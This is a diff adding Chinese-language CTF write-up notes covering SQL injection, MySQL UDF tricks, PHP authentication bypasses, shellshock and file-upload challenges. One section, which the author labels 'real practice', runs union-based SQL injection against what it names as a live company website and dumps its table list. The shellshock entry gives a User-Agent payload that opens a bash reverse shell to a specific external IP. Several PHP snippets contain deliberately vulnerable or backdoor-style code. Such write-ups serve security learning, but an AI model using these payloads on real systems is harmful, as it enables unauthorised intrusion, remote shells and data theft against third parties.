@@ -891,3 +891,367 @@ execc("ls")
 `nc -lvv 8888`
 
 flag:为SKCTF{Uni0n_@nd_c0mM4nD_exEc}
+
+### 实战2-注入
+
+这个是真的实战。。。
+
+给了一个网址:[http://www.kabelindo.co.id](http://www.kabelindo.co.id/)
+
+在提示下找到了注入点。
+
+
+
+测试
+
+```
+http://www.kabelindo.co.id/readnews.php?id=-5%20union%20select%201,2,3,database(),5#
+对单引号和双引号进行了转义,尝试宽字节注入没用
+
+用hex编码绕过
+
+```
+
+构造payload:id=-5%20union%20select%201,2,3,database(),5#
+
+查询表名:id=`-5 union select 1,2,3,GROUP_CONCAT(table_name) ,5 FROM information_schema.tables WHERE TABLE_SCHEMA=database(); #`
+
+table:**counter,csr,lowongan,mstdkb,mstdsg,mstpro,news,opsod,opsoh,pencarian,tabcus,tabgrp,tabmenu,tabmenu1,tabmenu2,tabprog,tabshp,tabslp,tabtcus,tabtmp,tabuser,tbnomax**
+
+查询列名:id= `-5 union select 1,2,3,GROUP_CONCAT(column_name),5 FROM information_schema.columns WHERE table_name = 0x6373#`
+
+flag: flag{tbnomax}
+
+一个地方显示字数有限制。。。
+
+## jarvis oj
+
+### re?
+
+
+
+这题看了别人的wp才知道怎么做
+
+下载下来后文件名为`udf.so.XXXXX`，用mysql导入一下。具体过程如下。
+将udf文件放到`/usr/lib/mysql/plugin/`文件夹中：
+
+```
+root@0e5b63de05fd:/usr/lib/mysql/plugin# wget https://dn.jarvisoj.com/challengefiles/udf.so.02f8981200697e5eeb661e64797fc172
+```
+
+
+
+登陆mysql后，加载help_me函数：
+
+```
+mysql> create function help_me returns string soname 'udf.so.02f8981200697e5eeb661e64797fc172';Query OK, 0 rows affected (2.04 sec)
+```
+
+
+
+利用help_me函数：
+
+```
+mysql> select help_me();+---------------------------------------------+| help_me()                                   |+---------------------------------------------+| use getflag function to obtain your flag!! |+---------------------------------------------+1 row in set (0.17 sec)
+```
+
+
+
+利用udf再创建一个getflag函数。
+
+```
+mysql> create function getflag returns string soname 'udf.so.02f8981200697e5eeb661e64797fc172';Query OK, 0 rows affected (0.05 sec)
+```
+
+
+
+得到flag：
+
+```
+mysql> select getflag();+------------------------------------------+| getflag()                                |+------------------------------------------+| PCTF{Interesting_U5er_d3fined_Function} |+------------------------------------------+1 row in set (0.00 sec)
+```
+
+## hackme
+
+###  hide and seek
+
+这题给了主页的地址，我还以为是题目错了。。我还在想是不是排行榜的flag交了一下，过了，但是没解决，后来看了别人的wp想了又想最后还是在主页里查了下flag，提交成功。。。。。。。
+
+### guestbook
+
+最基础的sql注入
+
+有个坑就是flag放在第二行，我还傻逼必的把第一行提供的图片做了各种分析
+
+### ping
+
+这题看过去ban掉了很多，但他千不该万不该没ban掉\`和*
+
+### scoreboard
+
+.....去看了源代码,还以管理员的方式登录,结果flag就在head里面。。
+
+### login3
+
+```php
+function load_user()
+{
+    global $secret, $error;
+
+    if(empty($_COOKIE['user'])) {
+        return null;
+    }
+
+    $unserialized = json_decode(base64_decode($_COOKIE['user']), true);
+    $r = hash_hmac('sha512', $unserialized['data'], $secret) != $unserialized['sig'];
+
+    if(hash_hmac('sha512', $unserialized['data'], $secret) != $unserialized['sig']) {
+        $error = 'Invalid session';
+        return false;
+    }
+
+    $data = json_decode($unserialized['data'], true);
+    return [
+        'name' => $data[0],
+        'admin' => $data[1]
+    ];
+}
+
+```
+
+一开始我还想着用sha那啥攻击
+
+后来看到了!=，有希望，当"123"!=true为真,成功绕过
+
+### login4
+
+```php
+if($_POST['name'] === 'admin') {
+    if($_POST['password'] !== $password) {
+        // show failed message if you input wrong password
+        header('Location: ./?failed=1');
+    }
+}
+```
+
+重定向后面没加exit()
+
+后面的代码仍然执行
+
+### login6
+
+
+
+```php
+if(!empty($_POST['data'])) {
+    try {
+        $data = json_decode($_POST['data'], true);
+    } catch (Exception $e) {
+        $data = [];
+    }
+    extract($data);
+    if($users[$username] && strcmp($users[$username], $password) == 0) {
+        $user = $username;
+    }
+}
+```
+
+这题原本有两种思路的:1.extract变量覆盖2.字符串==true成立
+
+但是题目的$user里没有admin的值,所以只能用变量覆盖,因为这个原因我卡了好久
+
+
+
+### login8
+
+大胆猜想小心求证
+
+这次题目不给源码了
+
+虽然我很快注意到了解题的关键cookie:login8cookie和login8sha512
+
+我确认login8cookie是序列化，但是我却没有经过任何验证就在心中认定sha512是有密钥加密的.
+
+最后看了别人的wp才走出自己的误区
+
+### dafuq-manager 2
+
+这题登入游客账号后，发现有个编辑，点进去看一下，试一下任意文件读取，成功
+
+### dafuq-manager 3
+
+代码审计软件真的好香。不过它的原理也只是用正则匹配敏感函数
+
+发现有个debug模式
+
+```php
+<?php
+function make_command($cmd) {
+    $hmac = hash_hmac('sha256', $cmd, $GLOBALS["secret_key"]);
+    return sprintf('%s.%s', base64_encode($cmd), $hmac);
+}
+function do_debug() {
+	print("<br />".$GLOBALS['__GET']['command']);
+	print("<br />".(make_command($GLOBALS['__GET']['command'])."<br />"));
+    assert(strlen($GLOBALS['secret_key']) > 40);
+    $dir = $GLOBALS['__GET']['dir'];
+    if (strcmp($dir, "magically") || strcmp($dir, "hacker") || strcmp($dir, "admin")) {
+        show_error('You are not hacky enough :(');
+    }
+    list($cmd, $hmac) = explode('.', $GLOBALS['__GET']['command'], 2);
+    $cmd = base64_decode($cmd);
+    $bad_things = array('system', 'exec', 'popen', 'pcntl_exec', 'proc_open', 'passthru', '`', 'eval', 'assert', 'preg_replace', 'create_function', 'include', 'require', 'curl',);
+    foreach ($bad_things as $bad) {
+        if (stristr($cmd, $bad)) {
+            die('2bad');
+        }
+    }
+    if (hash_equals(hash_hmac('sha256', $cmd, $GLOBALS["secret_key"]), $hmac)) {
+        die(eval($cmd));
+    } else {
+        show_error('What does the fox say?');
+    }
+}
+?>
+```
+
+阅读代码利用即可
+
+### wordpress 1
+
+这题刚看的时候以为是去看网页源代码。。
+
+结果是看源代码。。仔细看一下发现博客里有提供备份文件
+
+用正则匹配`.*f[l1][a4]g.*`
+
+找到flag所在位置
+
+```PHP
+function print_f14g()
+{
+	$h = 'm'.sprintf('%s%d','d',-4+9e0);
+	if($h($_GET['passw0rd']) === '5ada11fd9c69c78ea65c832dd7f9bbde') {
+		if(wp_get_user_ip() === '127.0.0.1') {
+			eval(mcrypt_decrypt(MCRYPT_RIJNDAEL_256, $h($_GET['passw0rd'].AUTH_KEY), base64_decode('zEFnGVANrtEUTMLVyBusu4pqpHjqhn3X+cCtepGKg89VgIi6KugA+hITeeKIpnQIQM8UZbUkRpuCe/d8Rf5HFQJSawpeHoUg5NtcGam0eeTw+1bnFPT3dcPNB8IekPBDyXTyV44s3yaYMUAXZWthWHEVDFfKSjfTpPmQkB8fp6Go/qytRtiP3LyYmofhOOOV8APh0Pv34VPjCtxcJUpqIw=='), MCRYPT_MODE_CBC, $h($_GET['passw0rd'].AUTH_SALT)));
+		} else {
+			die('</head><body><h1>Sorry, Only admin from localhost can get flag');
+		}
+	}
+}
+```
+
+### webshell
+
+这题很简单，就是remote_addr不好搞,必须得用服务器来测
+
+```php
+<?php 
+$cation = "str_rot13";
+$e_obfus="base64_decode";
+$e_cod = "gzinflate" ; 
+$sourc ="strrev"; 
+ function run() 
+ { 
+     if(isset($_GET['cmd']) ) 
+     { 
+         $cmd = hash('SHA512', $_SERVER['REMOTE_ADDR']) ^ (string)$_GET['cmd'];
+         $key = $_SERVER['HTTP_USER_AGENT'] . sha1("webshell.hackme.inndy.tw"); 
+         $sig = hash_hmac('SHA512', $cmd, $key); 
+         echo  urlencode(hash('SHA512', $_SERVER['REMOTE_ADDR']) ^ (string)$_GET['cmd']);
+         echo "<br />";
+         echo hash_hmac('SHA512', $_GET['cmd'], $key); 
+
+    } 
+    return false; 
+} 
+
+    run();
+?>
+```
+
+### command-executor
+
+收获:shellshock
+
+
+
+https://command-executor.hackme.inndy.tw/index.php
+
+刚开始的时候以为是命令执行绕过,试过大部分绕过方法都没用后,观察url发现:https://command-executor.hackme.inndy.tw/index.php?func=cmd&cmd=env
+
+func参数也可能是注入点,多次尝试发现这不是命令执行,猜测这是文件包含,试着用php://filter来读取源码成功.
+
+```
+cmd.php
+index.php
+ls.php
+man.php
+untar.php
+```
+
+代码审计时间......
+
+花了好久都没看出啥,最后看别人的wp发现有shellshock漏洞
+
+index.php:`putenv("$key=$val");`
+
+[详解shellcode](https://blog.csdn.net/Anprou/article/details/72819989)
+
+构造payload:`User-Agent: () { : ;};/bin/bash -i &> /dev/tcp/39.108.164.219/60000 0>&1;`
+
+记住:;和两个花括号之间必须有空格
+
+利用反弹shell
+
+找到flag在根目录下,但是无法读取,但发现flag_reader和他的源码
+
+```c
+#include <unistd.h>
+#include <syscall.h>
+#include <fcntl.h>
+#include <string.h>
+
+int main(int argc, char *argv[])
+{
+	char buff[4096], rnd[16], val[16];
+	if(syscall(SYS_getrandom, &rnd, sizeof(rnd), 0) != sizeof(rnd)) {
+		write(1, "Not enough random\n", 18);
+	}
+
+	setuid(1337);
+	seteuid(1337);
+	alarm(1);
+	write(1, &rnd, sizeof(rnd));
+	read(0, &val, sizeof(val));
+
+	if(memcmp(rnd, val, sizeof(rnd)) == 0) {
+		int fd = open(argv[1], O_RDONLY);
+		if(fd > 0) {
+			int s = read(fd, buff, 1024);
+			if(s > 0) {
+				write(1, buff, s);
+			}
+			close(fd);
+		} else {
+			write(1, "Can not open file\n", 18);
+		}
+	} else {
+		write(1, "Wrong response\n", 16);
+	}
+}
+
+```
+
+`flag-reader flag > /var/tmp/aaa < /var/tmp/aaa`
+
+最后的flag:FLAG{W0w U sh0cked m3 by 5h3115h0ck}
+
+## 杂
+
+### 2019suctf CheckIn
+
+这一题是个文件上传,限制了后缀为ph*和.htaccess的文件
+
+我一直试都没弄出来后来看别人的wp说使用.user.ini,fastcgi都可以用,学到了学到了
+
